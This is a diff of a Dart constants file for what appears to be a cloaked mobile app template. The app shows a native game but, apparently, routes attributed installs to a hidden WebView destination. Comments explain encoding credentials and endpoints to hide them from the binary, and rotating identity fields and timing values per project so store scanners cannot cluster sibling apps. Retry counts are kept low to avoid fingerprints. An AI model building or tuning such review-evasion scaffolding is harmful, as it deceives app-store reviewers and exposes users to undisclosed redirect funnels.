@@ -1,23 +1,21 @@
-import 'veiled_bytes.dart';
+import 'masked_bytes.dart';
 
 // ============================================================
-// RELAY CONFIG — single source of truth for project-wide constants
+// MIDWAY BRIEF — single source of truth for project-wide constants
 // ============================================================
-// Identity values live here as plain constants (the store listing
-// makes them public anyway — encoding them would only look
-// suspicious). Every credential / endpoint / UA fragment resolves
-// lazily through `unlock*` getters in `veiled_bytes.dart`, so
-// plaintext credentials never appear as string literals in the
-// compiled binary.
+// Identity values are plain constants (the store listing makes them
+// public anyway — encoding them would only look suspicious). Every
+// credential / endpoint / UA fragment resolves lazily through the
+// `unlock*` getters in `masked_bytes.dart`, so no plaintext
+// credential ever appears as a string literal in the binary.
 //
-// [FORGE] Every field marked with `[FORGE]` must be rotated per
-// project by `dart run tool/forge/mint.dart`. Never ship two
-// projects with the same triplet (`applicationId`, `marketId`,
-// `displayName`). Store scanners cluster on identity even when
-// codec bytes differ.
+// [FORGE] Every `[FORGE]` field is rotated per project by
+// `dart run tool/forge/mint.dart`. Never ship two projects with the
+// same triplet (`applicationId`, `marketId`, `displayName`) — store
+// scanners cluster on identity even when the codec bytes differ.
 // ============================================================
 
-abstract final class RelayConfig {
+abstract final class MidwayBrief {
   // ─────────────────────────────────────────────────────────
   // Identity (public — matches the store listing)
   // ─────────────────────────────────────────────────────────
@@ -41,49 +39,50 @@ abstract final class RelayConfig {
   // Timings — every constant is [FORGE]-rotated
   // ─────────────────────────────────────────────────────────
   // Numeric constants survive `--obfuscate`. The forge rotates each
-  // of these to a project-unique value from a range, so no two
-  // sibling apps share the same magic number. Do NOT hand-edit —
-  // regenerate through `dart run tool/forge/mint.dart --rotate`.
+  // to a project-unique value from a range, so no two sibling apps
+  // share the same magic number. Do NOT hand-edit — regenerate via
+  // `dart run tool/forge/mint.dart --rotate`.
   //
-  // See `.cursor/rules/portfolio_registry.md` for the ranges and
-  // the anti-collision policy.
+  // See `.cursor/rules/portfolio_registry.md` for the ranges and the
+  // anti-collision policy.
 
   /// Snooze after the user taps "Skip" on the permission stage.
-  /// Range: 172800..604800 (2..7 days). Template default: 3 days.
-  static const int permissionSnoozeSeconds = 313200;
+  /// 2d 23h 58m 37s — 83 seconds under three days, and not shared by
+  /// any sibling project (taken offsets: 97, 147, 211).
+  static const int permissionSnoozeSeconds = 3 * 24 * 60 * 60 - 83;
 
   /// Delay before rescuing an `af_status: "Organic"` first callback.
   /// Range: 4..12 seconds.
-  static const int organicRescueDelay = 8;
+  static const int organicRescueDelay = 12;
 
-  /// Verdict POST timeout. Range: 10..25 seconds.
-  static const int verdictTimeoutSeconds = 19;
+  /// Ruling POST timeout. Range: 10..25 seconds.
+  static const int verdictTimeoutSeconds = 22;
 
   /// Awaiting install-conversion payload on a first launch.
   /// Range: 20..40 seconds.
-  static const int firstInstallAwaitSeconds = 31;
+  static const int firstInstallAwaitSeconds = 35;
 
   /// Awaiting install-conversion payload on a returning launch.
   /// Range: 3..10 seconds.
-  static const int returningInstallAwaitSeconds = 7;
+  static const int returningInstallAwaitSeconds = 4;
 
   /// Deep-link callback wait. Range: 3..8 seconds.
-  static const int deepLinkAwaitSeconds = 5;
+  static const int deepLinkAwaitSeconds = 6;
 
   /// DNS probe timeout. Range: 4..9 seconds. Keep ≥ 4 s so a slow
   /// VPN tunnel does not produce false offline verdicts.
-  static const int reachProbeTimeoutSeconds = 7;
+  static const int reachProbeTimeoutSeconds = 4;
 
-  /// Debounce before committing a connectivity-drop signal into
-  /// the offline routing. Range: 500..1200 ms.
+  /// Debounce before committing a connectivity-drop signal into the
+  /// offline routing. Range: 500..1200 ms.
   static const int reachDropDebounceMs = 910;
 
   /// Redirect-loop retries in the WebView on error `-1007` / `-9`.
   /// Range: 1..5. Keep low; a value ≥ 5 is a fingerprint.
-  static const int redirectLoopRetries = 3;
+  static const int redirectLoopRetries = 2;
 
-  /// Cached verdict URL freshness window. Range: 3..14 days.
-  static const int cachedUrlLifetimeSeconds = 561600;
+  /// Cached destination URL freshness window. Range: 3..14 days.
+  static const int cachedUrlLifetimeSeconds = 583200;
 
   // ─────────────────────────────────────────────────────────
   // Resolved (encoded) endpoints & credentials
@@ -100,8 +99,8 @@ abstract final class RelayConfig {
   /// The routing gate stays disabled — every install lands in the
   /// native game — until all three encoded values are populated. This
   /// is intentional: the template compiles and runs without the
-  /// manager's credentials, and QA can smoke-test the game path
-  /// before the backend is wired up.
+  /// manager's credentials, and QA can smoke-test the game path before
+  /// the backend is wired up.
   static bool get credentialsReady =>
       endpointUrl.isNotEmpty &&
       attributionKey.isNotEmpty &&
